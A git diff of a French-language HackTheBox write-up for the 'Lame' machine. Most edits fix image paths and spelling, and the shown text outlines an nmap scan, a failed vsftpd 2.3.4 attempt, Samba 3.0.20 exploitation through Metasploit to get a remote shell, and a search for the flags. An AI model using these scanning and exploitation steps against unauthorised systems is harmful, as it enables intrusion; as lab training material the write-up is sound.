@@ -1,7 +1,7 @@
 # Lame - Easy
 
 ### Objectif : 
-    Se connecter à la machine et trouver les flags de user.txt et root.txt
+Se connecter à la machine et trouver les flags de user.txt et root.txt
 
 ### Information :
 
@@ -27,17 +27,17 @@ nmap 10.10.10.3 -sV -sC -Pn -p-
     * -sC : Scripts de vulnérabilité et de 
 
 ###### résultat du premier scan
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-01.png)
+!["screenshot Lame"](Machine-Lame-01.png)
 
 ###### résultats du deuxième scan
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-02.png)
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-03.png)
+!["screenshot"](../../Ressources/IMG/HTB/Machines/Lame/Machine-Lame-02.png)
+!["screenshot Lame"](Machine-Lame-03.png)
 
 ###### Détection des vulnérabilités :
 
-Nous utiliserons métasploit pour détecter et exploiter les vulnérabilités
+Nous utiliserons metasploit pour détecter et exploiter les vulnérabilités
 
-**Accès à métasploit**
+**Accès à metasploit**
 ```bash
 msfconsole
 ```
@@ -53,7 +53,7 @@ msfconsole
 ###### Exploitation de la vulnérabilité
 
 ##### vulnérabilité 1 : vsftpd 2.3.4
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-6.png)
+!["screenshot Lame"](Machine-Lame-6.png)
 
 Étant donné que le premier ne marche pas, on va essayer de chercher d'autres vulnérabilités : essayons l'os découvert grâce au scan nmap : **samba 3.0.20** 
 ##### vulnérabilité 2 : samba 3.0.20
@@ -65,10 +65,10 @@ msfconsole
  setg LHOST <Mon addresse IP>
  exploit
 ```
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-04.png)
+!["screenshot Lame"](Machine-Lame-04.png)
 
 
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-05.png)
+!["screenshot Lame"](Machine-Lame-05.png)
 Nous avons donc accès à la console de la cible
 ###### Recherche des fichier avec 
 ```bash
@@ -76,7 +76,7 @@ Nous avons donc accès à la console de la cible
 find / -name "nom_du_fichier" 2>/dev/null
 ```
 
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-07.png)
+!["screenshot Lame"](Machine-Lame-07.png)
 
 ### Ce que j'ai Appris :
 * Ceci est ma première Machine HackTheBox
